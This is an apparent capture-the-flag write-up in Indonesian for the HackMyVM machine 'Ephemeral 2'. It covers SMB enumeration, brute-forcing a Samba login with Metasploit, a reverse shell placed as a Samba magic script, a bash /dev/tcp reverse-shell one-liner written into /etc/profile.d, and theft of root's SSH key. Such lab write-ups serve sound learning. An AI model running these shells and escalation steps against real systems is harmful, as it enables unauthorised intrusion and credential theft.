---
layout: post
title: "HackMyVM: Ephemeral 2"
date: 2022-05-01
categories: hackmyvm
tags: [smb-login-check, cifs, cronjob, profile.d-writable, ssh]
---

Enumerasi SMB menggunakan *enum4linux* untuk mendapatkan *user-user*nya lalu mulai *brute force* untuk bisa akses ke **CIFS** (*Common Internet File System*) lalu mounting dan replacing *reverse shell* ke dalam *mounted directory* yang 
di dalamnya terdapat script dijalankan secara automasi bernama **smbscript.elf**. Dan setelahnya boleh disimak lebih dalam lagi mengenai pembahasan mesin *Ephemeral* seri ke dua
dengan difficulty **Medium** dari [HackMyVM](https://hackmyvm.eu). dibuat oleh [Proxy](https://hackmyvm.eu/profile/?user=Proxy). seri pertama malah dua minggu kemudian baru saya garap. 
setelah blog ini rilis, baru ada kayanya.

![damn](https://i.postimg.cc/Jn9khzPL/image.png)

![root](https://i.postimg.cc/Jhp3R8fr/image.png)


## Recon

Hasil scan disini adalah, SSH (22), HTTP (80), SMB (139), SMB (445).
```cs
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0a:cc:f1:53:7e:6b:31:2c:10:1e:6d:bc:01:b1:c3:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4EkKlQsLoJ+r82mQnd6FWkjL2Ry4tLVriMceGPvzHNFlbbkpa7kkAIf3TtOp7Tads45gLfrNVTC98MHegGZwvL3aIaFPp0LodGxJeQG2lgudoWY9M5sfLMd5oUpcykWXcZfpibQVVhQSpPg4tIpWRVrIKZrBo2CxV8XsRh5RevdNZzzJ6w3D8zuwaBkHD7KI+2eaiuAYrmEkbUVHLkstY/nHclJwsDBMkx+u4gv7Rz3S37gmYhg8a74iZqqFpDF47AJ8fcC3k6pXQr3iArgpOU2Rc20THgwn8nRBit2CzO9C5DIf1KvoKIlNftYXK+Wnw2FmIGUmF7YxjC3ys1uXDahRjcW6EKZpRb2XKzPNtfoR+sdOPvLJkcXubn5/HTuy5HKmfk7cByX6/6KwYau11OxrM87YL+Fyl0VUobTKrC3570aaFamtWCd/A7oB3xsxQ8pSr7l2Pjx+20BSGjvw7dkMG1Yecf/79Db9f+DvxrLEIUOxRUWAGijr++Ar5s88=
|   256 cd:19:04:a0:d1:8a:8b:3d:3e:17:ee:21:5d:cd:6e:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBlMZBD50d94mQuFM4n2frVjcsaG1yWdXgHdmKBMNddOg9M67uUbNp8jHiwF/XQ36yiBGxPXWvvGoxI4oM97c3M=
|   256 e5:6a:27:39:ed:a8:c9:03:46:f2:a5:8c:87:85:44:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBwwUJchIYxvumcFeCwJ4yZnFQPfYLQj3dnAKrIU4j+1
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 6h59m57s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 61913/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 63451/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53498/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7279/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2022-05-18T20:32:16
|_  start_date: N/A
| nbstat: NetBIOS name: EPHEMERAL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   EPHEMERAL<00>        Flags: <unique><active>
|   EPHEMERAL<03>        Flags: <unique><active>
|   EPHEMERAL<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00

```
kalau kaya gini biasanya saya sudah paham, langsung *smbmap* atau *enum4linux* untuk enumerasi lebih lanjut.

## -> 443: SMB Enumeration

```cs
---<redirected>---

=================================( Share Enumeration on 192.168.56.13 )=================================

Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SYSADMIN        Disk
        IPC$            IPC       IPC Service (ephemeral server (Samba, Ubuntu))
        Officejet_Pro_8600_CDECA1_ Printer
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.13

//192.168.56.13/print$  Mapping: DENIED Listing: N/A Writing: N/A
//192.168.56.13/SYSADMIN        Mapping: DENIED Listing: N/A Writing: N/A

---<redirected>---

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\randy (Local User)
S-1-22-1-1001 Unix User\ralph (Local User)

```

![lmfao](https://i.postimg.cc/5tqSHvDm/image.png)

ada 2 local unix user di mesin ini (randy, ralph), dan 2 directory shares yang bisa dijadikan untuk jalan selanjutnya. Tapi keduanya mempunyai status **DENIED** yang artinya jika ingin 
mengakses directory itu harus login ke SMB shellnya. maka dengan begitu saya mencoba untuk *brute force* agar bisa mengakses SMB ini dan play around.
2 user tadi saya save menjadi text.
```bash 
╭─ via [machines/ephemeral2] ‹node-›  ‹› 
╰─ echo -e 'randy\nralph' > users.txt
```

## -> Obtaining the password

Open *msfconsole* and then use the auxiliary of *smb_login* as the scanning tool.

![iaka](https://i.postimg.cc/Wpyx8LfJ/image.png)

and then i inserted a run command and hit the enter key

![asda](https://i.postimg.cc/jdPwdTpH/image.png)

waw, okay, dengan begini saya mendapatkan password dari *randy*, dan password yang dibawahnya itu mungkin salah (spoiler). lalu saya login SMB dan mencoba dengan password yang *success* itu.
tetap sama aja yang berhasil hanya *randy*, mungkin *metasploit* baru ngebug atau apa kurang tau juga saya.

## shell as randy

![image](https://i.postimg.cc/ht8dMnMD/image.png)

saya download semua file itu, dan saya letakkan dalam folder baru lagi untuk membuat isi-isinya terorganisir tidak tercampur ke yang lainnya. <br/> 
menariknya pada file *smb.conf*, saya jadi tertarik untuk mengetahui apa yang dimaksud *magic script* oleh konfigurasi dibawah ini.
```conf
[SYSADMIN]

path = /home/randy/smbshare
valid users = randy
browsable = yes
writeable = yes
read only = no
magic script = smbscript.elf
guest ok = yes
```
setelah itu, saya jadi teringat bahwasannya ini bisa dimounting ke local karena termasuk *CIFS*, lalu saya coba lah dengan command.

![img](https://i.postimg.cc/Y97RC89R/image.png)

lalu setelah itu saya berniat untuk membuat rev-shell untuk mencoba dan mencari tahu apakah *magic script* ini bebas untuk diisi apa aja, karena berbentuk ELF jadi ya executable lah jelas.
dan disambi dengan listening port pake *ncat*.

![lmfao](https://i.postimg.cc/RFPsF8Ym/image.png)

![lmfao2](https://i.postimg.cc/d329CxHD/image.png)

## shell as ralph

sebelum itu seperti biasa untuk stabilize shell.
```sh
$ export TERM=xterm-color
$ python3 -c 'import pty;pty.spawn("bash")'

#---send it to the background ^C-z---
$ stty -a; stty raw -echo; fg

---victim revshell---
$ stty rows 47 cols 112
```
![waw](https://i.postimg.cc/YqwqmhZD/image.png)

it's time to enumerate more stuff di mesin ini, menggunakan *LinPEAS* haha.
tapi sebelumnya alangkah sehatnya kalau saya masuk ke sistem menggunakan ssh saja agar tidak terjadi crash pada mounted directory. jadi kalau begitu saya copy ssh *private key* ke *randy's ssh directory*

![wget](https://i.postimg.cc/dtWpcf2R/image.png)

lalu, saya masuk lewat ssh agar jalur lebih aman dan lebih stabil hehe.

![apapun](https://i.postimg.cc/QtrnqZDD/image.png)

demi apapun, sepertinya tidak ada gunanya saya tulis metode untuk membuat stable shell, hadeh. Okay, back to the topic.<br/>
Ketika saya sudah seleai menjalankan *LinPEAS* lalu sayapun bergegas melihat output dari hasil scanning si script ini. Waw, betapa menariknya ada cronjob menajalankan script *ssh.sh* dari user *ralph*.

![cron](https://i.postimg.cc/h4CRKhg7/image.png)

ketika saya lihat, isi dari script ini ya sama sih intinya sama seperti nama scriptnya.
```sh 
#!/bin/bash


/usr/bin/ssh -o "StrictHostKeyChecking no" ralph@localhost -i /home/ralph/.ssh/id_rsa
```
lalu saya coba cek lagi apakah ada cara untuk *abuse* script diatas. dan saya menemukan *privilege* untuk user *randy* bisa write pada directory **profile.d**. yang kalau kita telurusi dari **hacktricks** official kira-kira seperti ini dalihnya.

![imageya](https://i.postimg.cc/ZKKYL1Y6/image.png)

yang mana artinya, 
> file pada **/etc/profile** atau file-file pada **/etc/profile.d** adalah script-script yang bisa dieksekusi ketika suatu user menjalankan sebuah shell baru. Oleh karenanya, jika kamu bisa menulis atau memodifikasi diantara file itu jika kau memiliki privilege.

maka tanpa banyak berpikir, saya membuat rev-shell dan diletakkan dalam **/etc/profile.d**.
```sh
$ echo "/bin/bash -i >& /dev/tcp/192.168.56.1/12345 0>&1" > kek.sh 
$ chmod +x kek.sh
```
lalu listening dengan **ncat**.

![ralph](https://i.postimg.cc/2yX5WwZs/image.png)

## rooting the system

![root](https://i.postimg.cc/wjD6xHw8/image.png)

ketika saya lihat isi dari *getfile.py*. ternyata HEHEHE

![damn](https://i.postimg.cc/Zqc43Hkw/image.png)

tidak ada permission kawand. jadi saya eksekusi aja daripada kelamaan langsung saya listening ke port 9999 menggunakan **nc** dan file path menggunakan **id_rsa** dari root. kalau misal kita dapat respon berarti
**id_rsa** tersedia dalam directory root.

![test](https://i.postimg.cc/kgxvQ1J3/image.png)

lalu saya ketik command seperti dibawah ini

```sh
$ sed '1,9d' id_root > id_root.new # untuk menghilangkan header
$ mv id_root.new id_root
$ chmod 400 id_root # read only
$ ssh -i id_root root@localhost
```
setelah itu, read the root flag!

![damnya](https://i.postimg.cc/4Nrg01Dx/image.png)

## Referensi

* <https://www.offensive-security.com/metasploit-unleashed/smb-login-check/>
* <https://linoxide.com/howto-mount-smb-filesystem-using-etcfstab/>
* <https://cifs.com/>
* <https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/>
* <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path>
